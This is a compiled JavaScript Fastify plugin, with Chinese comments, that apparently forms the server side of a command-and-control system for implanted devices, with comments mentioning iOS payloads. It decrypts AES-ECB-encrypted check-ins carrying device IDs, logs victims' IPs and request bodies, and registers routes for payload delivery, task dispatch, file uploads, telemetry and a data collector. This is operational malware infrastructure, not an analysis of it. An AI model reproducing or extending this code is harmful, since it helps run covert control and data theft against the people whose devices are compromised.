import { Readable } from 'node:stream';
import { C2Crypto } from '../../core/crypto/aes-ecb.js';
import { getRealIP } from '../../core/utils/ip.js';
import { logger, logAls } from '../../core/logger/index.js';
import { aliveRoute } from './routes/alive.js';
import { activateRoute } from './routes/activate.js';
import { eventRoute } from './routes/event.js';
import { uploadRoute } from './routes/upload.js';
import { telemetryRoute } from './routes/telemetry.js';
import { configRoute } from './routes/config.js';
import { payloadRoute } from './routes/payload.js';
import { ipSyncRoute } from './routes/ip-sync.js';
import { taskRoute } from './routes/task.js';
import { collectorPlugin } from '../collector/index.js';
// ★★ T23（审核 C 的 C-13）：C2 控制面·设备侧防护层。
//   背景：本插件与 apiPlugin 是【兄弟】⇒ 12 个端点匿名可达（审核 C 实测 200）。
//   而【载荷侧无凭证机制】（实测 05-ios 全树零命中）
//   ⇒ 不能套 authMiddleware（会断载荷链）。
//   ⇒ 用 guard 做限频 + body 限制 + 审计 + 可选白名单（不要求凭证）。
import { installC2Guard } from './guard.js';
export async function c2Plugin(fastify) {
    // ★★★ T23：先挂防护层（preHandler 按注册顺序执行）
    installC2Guard(fastify);
    // preParsing: decrypt C2 requests
    fastify.addHook('preParsing', async (request, reply, payload) => {
        const timestamp = request.headers['x-ts'];
        if (!timestamp)
            return payload;
        if (request.url === '/t')
            return payload;
        const chunks = [];
        for await (const chunk of payload) {
            chunks.push(chunk);
        }
        const raw = Buffer.concat(chunks);
        if (raw.length === 0)
            return Readable.from([]);
        try {
            const decoded = Buffer.from(raw.toString('utf8'), 'base64');
            const decrypted = C2Crypto.decryptRequest(decoded, timestamp);
            request.realIP = getRealIP(request);
            request.channelCode = decrypted.channel || decrypted.c || '';
            request.deviceId = decrypted.unique || decrypted.u || '';
            // 追加 ALS 上下文
            const store = logAls.getStore();
            if (store) {
                store.deviceId = request.deviceId;
                store.channelCode = request.channelCode;
                store.realIP = request.realIP;
            }
            const jsonStr = JSON.stringify(decrypted);
            request.headers['content-type'] = 'application/json';
            request.headers['content-length'] = String(Buffer.byteLength(jsonStr));
            return Readable.from([Buffer.from(jsonStr)]);
        }
        catch (err) {
            logger.warn({ err, url: request.url }, 'C2 request decryption failed');
            // payload stream 已被消费，用 raw buffer 重建
            request.headers['content-length'] = String(raw.length);
            return Readable.from([raw]);
        }
    });
    // onSend: encrypt C2 responses
    fastify.addHook('onSend', async (request, reply, payload) => {
        const timestamp = request.headers['x-ts'];
        if (!timestamp)
            return payload;
        if (!payload || payload === 'OK')
            return payload;
        try {
            const data = typeof payload === 'string' ? JSON.parse(payload) : payload;
            const encrypted = C2Crypto.encryptResponse(data, timestamp);
            reply.header('content-type', 'text/plain');
            return encrypted;
        }
        catch (err) {
            logger.warn({ err, url: request.url }, 'C2 response encryption failed');
            return payload;
        }
    });
    // onResponse: log C2 requests
    fastify.addHook('onResponse', async (request, reply) => {
        if (request.url === '/vhx')
            return;
        if (request.url.startsWith('/api/ip-sync/'))
            return;
        const duration = Math.round(reply.elapsedTime || 0);
        const ip = request.realIP || getRealIP(request);
        let extra = '';
        if (request.url === '/t') {
            extra = ' [file-upload]';
        }
        else if (request.body) {
            try {
                const bodyStr = JSON.stringify(request.body);
                const preview = bodyStr.length > 4096 ? bodyStr.substring(0, 4096) + '...' : bodyStr;
                extra = ` ${preview}`;
            }
            catch (err) {
                extra = ' [body serialize error]';
            }
        }
        logger.info(`${request.method} ${request.url} ${reply.statusCode} ${duration}ms ${ip}${extra}`);
    });
    // Register all C2 routes
    await fastify.register(aliveRoute);
    await fastify.register(activateRoute);
    await fastify.register(eventRoute);
    await fastify.register(uploadRoute);
    await fastify.register(telemetryRoute);
    await fastify.register(configRoute);
    await fastify.register(payloadRoute);
    await fastify.register(ipSyncRoute);
    await fastify.register(taskRoute);
    await fastify.register(collectorPlugin);
}
//# sourceMappingURL=index.js.map